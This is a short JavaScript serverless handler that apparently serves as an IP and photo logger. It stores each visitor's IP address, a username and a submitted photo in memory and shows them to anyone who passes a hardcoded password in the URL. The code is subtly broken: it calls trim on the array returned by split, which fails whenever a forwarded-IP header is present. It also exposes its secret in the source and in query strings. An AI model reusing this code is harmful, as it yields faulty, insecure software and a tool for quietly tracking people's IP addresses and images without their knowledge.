// api/log.js

const SECRET_PASSWORD = "mysecret123";
let ipLog = [];

export default function handler(req, res) {
  const forwarded = req.headers['x-forwarded-for'];
  const ip = forwarded ? forwarded.split(',').trim() : req.headers['x-real-ip'] || req.socket.remoteAddress;
  const timestamp = new Date().toISOString();

  // Handle viewing panel requests
  if (req.method === 'GET') {
    const { secret } = req.query;
    if (!secret || secret !== SECRET_PASSWORD) {
      return res.status(403).json({ error: "Access Denied" });
    }
    return res.status(200).json({ logs: ipLog });
  }

  // Handle saving new submission data
  if (req.method === 'POST') {
    const { username, photo } = req.body || {};

    if (ip) {
      ipLog.unshift({ 
        username: username || "Anonymous",
        ip: ip, 
        photo: photo || "No Photo Attached",
        time: timestamp
      });
      
      if (ipLog.length > 50) ipLog.pop();
    }

    return res.status(200).json({ status: "logged" });
  }

  return res.status(405).end();
}
